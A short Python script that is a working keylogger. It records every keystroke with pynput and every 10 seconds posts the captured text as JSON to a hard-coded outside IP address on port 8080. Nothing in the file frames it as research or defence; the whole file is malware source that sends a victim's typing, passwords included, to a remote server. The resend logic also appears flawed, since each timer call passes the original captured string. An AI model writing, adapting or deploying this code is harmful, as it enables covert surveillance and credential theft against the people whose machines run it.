import json
import threading
import requests
from pynput import keyboard

# Constants
IP_ADDRESS = "109.74.200.23"
PORT_NUMBER = "8080"
TIME_INTERVAL = 10

# Global variable
text = ""

def send_post_request(ip_address, port_number, text):
    try:
        payload = json.dumps({"keyboardData": text})
        requests.post(f"http://{ip_address}:{port_number}",
                      data=payload, headers={"Content-Type": "application/json"})
        timer = threading.Timer(TIME_INTERVAL, send_post_request, args=(ip_address, port_number, text))
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
        pass
    elif key == keyboard.Key.esc:
        return None
    else:
        text += str(key).strip("'")
    return None

with keyboard.Listener(on_press=on_press) as listener:
    send_post_request(IP_ADDRESS, PORT_NUMBER, text)
    listener.join()